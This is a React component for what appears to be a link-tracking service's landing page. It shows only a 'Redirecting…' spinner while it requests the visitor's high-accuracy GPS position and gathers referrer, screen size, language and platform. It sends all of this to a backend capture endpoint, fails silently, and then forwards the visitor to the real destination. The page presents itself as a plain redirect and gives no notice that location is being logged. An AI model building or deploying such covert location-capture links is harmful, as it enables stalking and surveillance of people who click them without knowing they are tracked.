import React, { useEffect, useRef } from "react";
import { useParams } from "react-router-dom";

const BACKEND_URL = import.meta.env.VITE_BACKEND_URL || "http://localhost:5001";

export default function TrackingCapture() {
  const { token } = useParams();
  const hasCaptured = useRef(false);

  useEffect(() => {
    if (hasCaptured.current) return;
    hasCaptured.current = true;
    captureAndRedirect();
  }, [token]);

  async function getGPSLocation() {
    return new Promise((resolve) => {
      if (!navigator.geolocation) return resolve(null);

      // 3-second timeout — if denied or slow, move on without GPS
      const timer = setTimeout(() => resolve(null), 3000);

      navigator.geolocation.getCurrentPosition(
        (pos) => {
          clearTimeout(timer);
          resolve({
            gpsLat: pos.coords.latitude,
            gpsLon: pos.coords.longitude,
            gpsAccuracy: Math.round(pos.coords.accuracy), // in metres
          });
        },
        () => {
          clearTimeout(timer);
          resolve(null); // denied or unavailable
        },
        { enableHighAccuracy: true, timeout: 3000, maximumAge: 0 }
      );
    });
  }

  async function captureAndRedirect() {
    let destinationUrl = null;
    try {
      // Request GPS (times out after 3s if denied)
      const gps = await getGPSLocation();

      const payload = {
        token,
        referrer: document.referrer || null,
        screenWidth: window.screen.width,
        screenHeight: window.screen.height,
        language: navigator.language,
        platform: navigator.platform,
        // GPS fields — null if denied
        gpsLat: gps?.gpsLat ?? null,
        gpsLon: gps?.gpsLon ?? null,
        gpsAccuracy: gps?.gpsAccuracy ?? null,
      };

      const res = await fetch(`${BACKEND_URL}/api/links/capture`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });

      const data = await res.json();
      destinationUrl = data?.destinationUrl || null;
    } catch {
      // silent fail
    }

    if (destinationUrl) {
      window.location.replace(destinationUrl);
    }
  }

  return (
    <div style={{
      minHeight: "100vh",
      display: "flex",
      alignItems: "center",
      justifyContent: "center",
      background: "#fff",
      fontFamily: "sans-serif",
    }}>
      <div style={{ textAlign: "center", color: "#999", fontSize: 14 }}>
        <div style={{
          width: 32,
          height: 32,
          border: "3px solid #eee",
          borderTop: "3px solid #555",
          borderRadius: "50%",
          margin: "0 auto 12px",
          animation: "spin 0.8s linear infinite",
        }} />
        Redirecting…
        <style>{`@keyframes spin { to { transform: rotate(360deg); } }`}</style>
      </div>
    </div>
  );
}